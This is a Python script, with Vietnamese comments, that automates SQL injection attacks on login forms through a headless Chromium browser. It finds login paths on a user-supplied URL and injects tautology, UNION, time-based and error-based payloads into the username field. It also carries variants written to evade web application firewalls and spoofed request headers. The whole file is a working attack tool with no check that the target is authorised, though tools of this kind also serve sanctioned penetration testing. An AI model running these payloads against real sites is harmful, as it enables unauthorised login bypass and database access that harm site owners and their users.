import time
import signal
import sys
import logging
from playwright.sync_api import sync_playwright, Playwright
from playwright._impl._errors import TimeoutError

# Thiết lập logging
logging.basicConfig(filename='sqli_scan.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Danh sách payloads SQLi chính
SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1 -- ", "' OR 1=1 #", "admin' OR '1'='1",
    "1' UNION SELECT NULL, NULL -- ", "' AND SLEEP(5) -- ", "' OR SLEEP(5) -- ",
    "1' WAITFOR DELAY '0:0:5' -- ", "' AND 1=CONVERT(int,@@version) -- "
]

# Các biến thể payload để bypass WAF
WAF_BYPASS_PAYLOADS = {
    "' AND SLEEP(5) -- ": [
        "' AND SLEEP(5) -- ",
        "' and sleep(5) -- ",
        "' AND SLEEP(5)/*comment*/",
        "' AND IF(1=1, SLEEP(5), 0) -- ",
        "' AND SLEEP(5) %2D%2D",
        "' AND SLEEP(5) --+"
    ],
    "' OR SLEEP(5) -- ": [
        "' OR SLEEP(5) -- ",
        "' or sleep(5) -- ",
        "' OR SLEEP(5)/*comment*/",
        "' OR IF(1=1, SLEEP(5), 0) -- ",
        "' OR SLEEP(5) %2D%2D",
        "' OR SLEEP(5) --+"
    ],
    "1' WAITFOR DELAY '0:0:5' -- ": [
        "1' WAITFOR DELAY '0:0:5' -- ",
        "1' waitfor delay '0:0:5' -- ",
        "1' WAITFOR DELAY '0:0:5'/*comment*/",
        "1' IF(1=1, WAITFOR DELAY '0:0:5', 0) -- ",
        "1' WAITFOR DELAY '0:0:5' %2D%2D",
        "1' WAITFOR DELAY '0:0:5' --+"
    ]
}

# Các lỗi SQL phổ biến để phát hiện SQLi
SQLI_ERRORS = [
    "error in your SQL syntax", "mysql_", "SQLSTATE[", "unclosed quotation",
    "Incorrect syntax near", "sqlite_", "ORA-", "PostgreSQL", "DB2 SQL"
]

# Các dấu hiệu đăng nhập thành công
LOGIN_SUCCESS_INDICATORS = [
    "welcome", "dashboard", "logout", "profile", "success", "logged in"
]

# Các dấu hiệu bị WAF chặn
WAF_INDICATORS = [
    "forbidden", "blocked", "access denied", "403"
]

# Biến toàn cục
stop_scanning = False
results_found = []

# Xử lý Ctrl+C
def signal_handler(sig, frame):
    global stop_scanning
    print("\n[!] Stopping scan...")
    stop_scanning = True
    if results_found:
        with open("sqli_results.txt", "a") as f:
            for result in results_found:
                f.write(result + "\n")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Hàm quét path ban đầu
def scan_initial_paths(target):
    valid_paths = []
    print(f"\n[*] Scanning initial paths on {target}...")
    
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(headless=True)
        context = browser.new_context(ignore_https_errors=True)
        page = context.new_page()

        try:
            page.goto(target, timeout=15000)
            default_content = page.content()
            print(f"[*] Default content loaded from {target}")
        except TimeoutError:
            print(f"[!] Timeout loading default content from {target}")
            default_content = ""
            browser.close()
            return valid_paths

        login_paths = ["/login", "/login.php", "/signin", "/auth"]
        for path in login_paths:
            full_url = f"{target.rstrip('/')}{path}"
            try:
                page.goto(full_url, timeout=15000)
                content = page.content()
                if content and ("form" in content.lower() or page.query_selector("form")):
                    print(f"[+] Found login path: {path}")
                    valid_paths.append(full_url)
                else:
                    print(f"[-] No login form found at {path}")
            except TimeoutError:
                print(f"[-] Timeout or inaccessible: {path}")
            except Exception as e:
                print(f"[-] Error on {path}: {e}")

        browser.close()
    return valid_paths

# Hàm kiểm tra SQLi trên form với khả năng bypass WAF
def exploit_sqli(playwright, url):
    global stop_scanning
    browser = None
    try:
        browser = playwright.chromium.launch(headless=True)
        context = browser.new_context(
            ignore_https_errors=True,
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            extra_http_headers={
                "Referer": url,
                "Accept": "text/html",
                "X-Requested-With": "XMLHttpRequest",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Dest": "document"
            }
        )
        page = context.new_page()

        for sqli_payload in SQLI_PAYLOADS:
            print(f"[*] Testing SQLi with payload: {sqli_payload} on {url}...")
            # Nếu payload có biến thể để bypass WAF, lấy danh sách biến thể
            payloads_to_test = WAF_BYPASS_PAYLOADS.get(sqli_payload, [sqli_payload])

            for payload in payloads_to_test:
                # Retry logic cho mỗi payload
                for attempt in range(3):
                    try:
                        print(f"[*] Opening Chrome to login at {url} (Attempt {attempt + 1}/3) with payload: {payload}...")
                        page.goto(url, timeout=30000)
                        page.wait_for_load_state("networkidle", timeout=30000)
                        print(f"[*] Page loaded successfully (Attempt {attempt + 1}/3)")
                        break
                    except TimeoutError:
                        print(f"[!] Timeout loading {url} (Attempt {attempt + 1}/3)")
                        if attempt == 2:
                            print(f"[!] Failed to load {url} after 3 attempts, skipping payload {payload}")
                            continue
                        time.sleep(2)
                    except Exception as e:
                        print(f"[!] Error loading page (Attempt {attempt + 1}/3): {e}")
                        if attempt == 2:
                            print(f"[!] Failed to load {url} after 3 attempts, skipping payload {payload}")
                            continue
                        time.sleep(2)

                # Kiểm tra và điền dữ liệu
                try:
                    print(f"[*] Waiting for form elements on {url}...")
                    username_input = page.wait_for_selector("input[name='username']", state="visible", timeout=15000)
                    password_input = page.wait_for_selector("input[name='password']", state="visible", timeout=15000)
                    submit_button = page.wait_for_selector("button[type='submit']", state="visible", timeout=15000)
                    print(f"[*] Form elements found: username={username_input is not None}, password={password_input is not None}, submit={submit_button is not None}")

                    # Xử lý phản hồi để lấy mã trạng thái
                    response = None
                    def handle_response(resp):
                        nonlocal response
                        response = resp

                    page.on("response", handle_response)

                    print(f"[*] Entering payload: {payload}...")
                    page.fill("input[name='username']", payload)
                    page.fill("input[name='password']", "password123")
                    print(f"[*] Submitting form...")
                    
                    # Đo thời gian submit
                    start_time = time.time()
                    page.click("button[type='submit']")
                    page.wait_for_load_state("networkidle", timeout=10000)
                    elapsed_time = time.time() - start_time

                    # Kiểm tra mã trạng thái HTTP
                    if response:
                        status = response.status
                        print(f"[*] HTTP Status: {status}")
                        if status == 403:
                            print(f"[!] WAF detected: Forbidden (Payload: {payload})")
                            continue  # Thử payload khác trong danh sách biến thể

                    # Kiểm tra nội dung phản hồi
                    content = page.content().lower()
                    if any(indicator in content for indicator in WAF_INDICATORS):
                        print(f"[!] WAF detected: Content indicates block (Payload: {payload})")
                        continue  # Thử payload khác trong danh sách biến thể

                    # Kiểm tra các dấu hiệu SQLi
                    if any(error in content for error in SQLI_ERRORS):
                        result = f"[!!!] SQLi found with {payload} at {url} (Error-based)"
                        print(result)
                        results_found.append(result)
                        logging.info(result)
                        return True
                    elif any(indicator in content for indicator in LOGIN_SUCCESS_INDICATORS):
                        result = f"[!!!] SQLi found with {payload} at {url} (Bypass login)"
                        print(result)
                        results_found.append(result)
                        logging.info(result)
                        return True
                    elif "SLEEP" in payload or "DELAY" in payload:
                        if elapsed_time >= 4:  # Delay đáng kể
                            result = f"[!!!] SQLi found with {payload} at {url} (Time-based) (Response time: {elapsed_time}s)"
                            print(result)
                            results_found.append(result)
                            logging.info(result)
                            return True
                        else:
                            print(f"[-] No delay detected (Response time: {elapsed_time}s)")

                except TimeoutError as e:
                    print(f"[!] Timeout waiting for form elements: {e}")
                    continue
                except Exception as e:
                    print(f"[!] Error processing form: {e}")
                    continue

        return False

    except Exception as e:
        print(f"[!] Error testing SQLi on {url}: {e}")
        return False
    finally:
        if browser:
            browser.close()

# Hàm quét tự động
def auto_exploit(target, paths, max_time=600):
    global stop_scanning
    start_time = time.time()
    print(f"\n[*] Starting SQLi scan on {target} (Max time: {max_time}s)...")

    with sync_playwright() as playwright:
        for path in paths:
            if stop_scanning or time.time() - start_time > max_time:
                break
            print(f"\n[*] Testing path: {path}")
            exploit_sqli(playwright, path)

    if results_found:
        with open("sqli_results.txt", "a") as f:
            for result in results_found:
                f.write(result + "\n")

# Menu chính
def scan_sqli_and_continue():
    global stop_scanning
    while True:
        stop_scanning = False
        results_found.clear()

        target_url = input("Enter target URL to scan for SQLi (e.g., https://example.com/): ")
        valid_paths = scan_initial_paths(target_url)
        
        if valid_paths:
            print(f"\n[*] Found {len(valid_paths)} login paths. Starting SQLi scan...")
            auto_exploit(target_url, valid_paths)
        else:
            print("[!] No login paths found. Scan skipped.")

        print("\nScan completed!")
        print("1. Scan another URL\n2. Exit")
        choice = input("Choice (1 or 2): ")
        if choice != "1":
            print("[*] Exiting...")
            sys.exit(0)

if __name__ == "__main__":
    print("=== SQL Injection Scanner (Playwright Automation with Extended Payloads) ===")
    scan_sqli_and_continue()